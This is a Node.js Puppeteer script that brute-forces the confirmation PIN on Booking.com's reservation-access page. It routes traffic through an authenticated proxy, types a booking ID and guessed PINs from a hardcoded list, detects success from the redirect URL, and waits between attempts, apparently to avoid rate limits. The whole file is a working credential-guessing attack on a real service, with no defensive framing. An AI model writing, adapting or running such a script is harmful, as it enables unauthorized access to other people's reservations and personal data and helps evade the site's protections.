require('dotenv').config();
const puppeteer = require('puppeteer');
const fs = require('fs').promises;

const bookingId = process.env.BOOKING_ID;
const proxyUser = process.env.PROXY_USER;
const proxyPass = process.env.PROXY_PASS;
const proxyServer = process.env.PROXY_SERVER;
const pins = ['0966', '1111', '2222', '3333', '4444'];
const url = 'https://secure.booking.com/help/confirmation_pin_auth?';

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function tryPin(pin) {
  const browser = await puppeteer.launch({
    headless: false,
    args: [`--proxy-server=http://${proxyServer}`]
  });
  const page = await browser.newPage();
  await page.authenticate({
    username: proxyUser,
    password: proxyPass
  });
  let result = { pin, success: false, message: '', url: '' };

  try {
    await page.goto(url, { waitUntil: 'networkidle2' });

    await page.waitForSelector('input[name="confirmationNumber"]', { timeout: 15000 });
    await wait(1000);

    await page.type('input[name="confirmationNumber"]', bookingId, { delay: 100 });
    await page.type('input[name="pinCode"]', pin, { delay: 100 });

    await wait(500);

    let navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 }).catch(() => null);
    await page.click('button[type="submit"]');
    await navigationPromise;

    await wait(5000);

    const currentUrl = page.url();
    result.url = currentUrl;

    if (currentUrl.includes('reservation?hc_origin=auth_conf_pin')) {
      result.success = true;
      result.message = 'SUCCESS';
      console.log(`[${new Date().toISOString()}] SUCCESS: PIN ${pin} is correct!`);
    } else {
      result.message = 'FAILED';
      console.log(`[${new Date().toISOString()}] FAILED: PIN ${pin}`);
    }
  } catch (err) {
    result.message = `ERROR: ${err.message}`;
    console.log(`[${new Date().toISOString()}] ERROR: PIN ${pin} - ${err.message}`);
    try {
      await page.screenshot({ path: `error_${pin}_${Date.now()}.png` });
    } catch (e) {
      console.log('Screenshot failed:', e.message);
    }
  }

  await fs.appendFile('agent-log.txt', JSON.stringify(result) + '\n');
  await browser.close();
  return result.success;
}

async function main() {
  for (let i = 0; i < pins.length; i++) {
    console.log(`\n[${new Date().toISOString()}] Trying PIN: ${pins[i]}`);
    const success = await tryPin(pins[i]);
    if (success) {
      console.log('Correct PIN found, exiting...');
      break;
    }
    if (i < pins.length - 1) {
      console.log('Waiting 60 seconds before next attempt...');
      await wait(60000);
    }
  }
  console.log('Process finished.');
}

main();